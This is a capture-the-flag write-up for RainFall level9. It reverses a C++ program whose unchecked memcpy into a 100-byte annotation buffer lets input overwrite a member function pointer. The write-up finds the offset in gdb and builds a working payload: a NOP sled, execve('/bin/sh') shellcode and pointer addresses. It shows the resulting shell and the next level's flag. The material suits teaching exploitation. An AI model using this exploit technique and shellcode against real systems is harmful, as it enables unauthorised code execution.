# Solution

So the first thing that we will find while trying to reverse the program is that this time it's not c but CPP,
so here is the code of the reversed program 

```cpp
class N {
    public:
        int     nb;
        int     (N::*func)(N &);
        char    annotation[100];

        N(int val) : nb(val)
        {
            this->func = &N::operator+;
        }
        int operator+(N &rhs)
        {
            return this->nb + rhs.nb;
        }
        int operator-(N &rhs)
        {
            return this->nb - rhs.nb;
        }
        void    setAnnotation(char *str)
        {
            memcpy(this->annotation, str, strlen(str));
        }
};

int main(int ac, char **av)
{
    if (ac < 1)
        _exit(1);

    N *a = new N(5);
    N *b = new N(6);

    a->setAnnotation(av[1]);
    return (b->*(b->func))(*a);
}
```

So here the exploit is little bit trickier but still rellying on simple concept such as buffer overflow,
so the only twist to the buffer overflow need to this exploit is that we need to overwrite a function pointer,
so it wont point to the function `N::operator+` which is the overload operator on + for the class N,
but instead it will point your shellcode so you can start a shell.


So let's proceed with the creation of the exploit we need first to find how we can overwrite the pointer,
since in the reverse code we can find that only one function is called to write a string from your input, 
we can easily assume that the mistake come from the function named `setAnnotation`

Lets take a look at the definition:

```cpp
void    setAnnotation(char *str)
{
    memcpy(this->annotation, str, strlen(str));
}
```

So we can see it use memcpy on the member `annotation` which is a buffer of size 100 byte,
so memcpy such as strcpy is not safe and can be used to overflow of buffer if the input size is not checked,
so since we can input more then what you except you can overflow and overwrite the member function pointer,
which is what we gonna do first we need to find the offset at which you are starting to overwrite the function pointer.

So let's start `gdb-gef` and try to find the offset value.

```sh
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

So we create a de brujin string to find the offset, then we rerun the program with that de brujin string to find the offset.

```sh
gef➤  r "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
```

We find ourselve to segfault perfect (SIGSEGV).

```asm
    0x8048680 <main+140>       mov    eax, DWORD PTR [eax]
 →  0x8048682 <main+142>       mov    edx, DWORD PTR [eax]
    0x8048684 <main+144>       mov    eax, DWORD PTR [esp+0x14]
```

as we can see we segfault trying to deref register eax so we probably overwrite the value eax let's check the value of eax

```sh
gef➤  p $eax
$1 = 0x62616163
```

That's our de brujin string, so now we need to find the offset.

```sh
gef➤  pattern search $eax
[+] Searching for '63616162'/'62616163' with period=4
[+] Found at offset 108 (little-endian search) likely
```

So now lets make a simple test we will run a padding of "A" until 108 and after that we will write 4 B, 4 C, 4 D.
to see if it work as attended and 108 is really the offset.

```sh
gef➤  r $(perl -e 'print "A"x108 . "B"x4 . "C"x4 . "D"x4')
gef➤  p $eax
$2 = 0x42424242
```

So yes inded it work fine after 108 byte of padding you can overwrite the address of the member function pointer inside `a`.
 
So from this now we need to use a shellcode with a nop sled to allow us to launch a shell, the only particularity is that,
instead of using a return address that goes to the nop sled we need first to use another address that will point to the nop sled return address.

Why ? Because we dereference a pointer before meaning that before using the pointer function we use a pointer to access that pointer function,
this is translated in assembly by those instruction where we segfault


```asm
   0x08048680 <+140>:   mov    eax,DWORD PTR [eax]  ; first dereference of the pointer to access the function pointer (this is not overwite value but the default class dereference)
=> 0x08048682 <+142>:   mov    edx,DWORD PTR [eax]  ; second dereference of the pointer function to access to the function stored in edx now. (this is the overwrite value)
   ...                                              ; non important stuff
   0x08048693 <+159>:   call   edx                  ; call the function that was stored inside the member pointer function
                                                    ; So for the exploit edx should be the return address that leads to the nop sled
                                                    ; once this is done we should find ourselve to hit the shellcode and pop a shell.
```

So what do we need to do ?
Well we need to overwrite the return address that will give us an other return address that will point to the nop sled.

We need to break before the call edx instruction and take a look at the register and see if everything is properly set.
So this will look like this:

```sh
gef➤  r $(perl -e 'print "\x90"x104 . "\xd0\xd3\x04\x08" . "\x1c\xd4\x04\x08"') # padding of 104 so the 4 last byte before overwrite will be the other return address to the nop sled
gef➤  p $eax
$3 = 0x804d420                      # eax address (b class variable)
gef➤  x/wx 0x804d420                # deref to the class
0x804d420:      0x0804d41c          # member function pointer
gef➤  x/wx 0x0804d41c               # deref to member function pointer
0x804d41c:      0x0804d3d0          # function address to call
gef➤  x/xw 0x0804d3d0               # call the function
0x804d3d0:      0x90909090          # led to our crafted nop sled + payload
gef➤  p $edx                        # check of edx register before call edx instruction
$4 = 0x804d3d0                      # properly call the right function address. (our nop sled start)
```

So from now we need to add the shellcode we will use the same shellcode used previously,
and we need to reduce the padding by the size of the of the shellcode so the exploit will look like this now

```sh
# Here the addresss changed because when using gdb-gef we are on our machine and not the VM,
# so we need to find the address inside the VM using gdb it's exactly the same process but the address are different.

$(perl -e 'print "\x90"x76 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" . "8\xa0\x04\x08" . "t\xa0\x04\x08";') ```
Now lets try to run this payload !

```sh
level9@RainFall:~$ ./level9 $(perl -e 'print "\x90"x76 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" . "8\xa0\x04\x08" . "t\xa0\x04\x08";')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

We have a shell and can get the flag !
